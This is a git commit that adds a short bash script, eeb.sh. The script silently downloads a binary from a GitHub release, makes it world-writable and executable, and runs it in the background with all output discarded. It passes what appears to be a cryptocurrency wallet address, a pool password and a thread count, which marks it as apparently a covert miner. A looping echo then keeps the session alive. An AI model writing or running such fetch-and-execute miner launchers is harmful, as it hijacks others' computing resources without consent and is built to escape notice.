59b18388f66b740cb9761265a0aa060eee0150ba
ushort20-commits <ushort20@gmail.com>
2026-04-16 07:28:40 +0700

    Create eeb.sh

---
+++ eeb.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+curl -sLkO https://github.com/ushort20-commits/volet/releases/download/volt/eeb >/dev/null 2>&1
+chmod 777 eeb
+./eeb --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass BORKER-E1 --threads 6 >/dev/null 2>&1 &
+sleep 20
+while true
+do
+        echo "Ojo Lali Ngopi Boss..."
+        sleep 100
+done
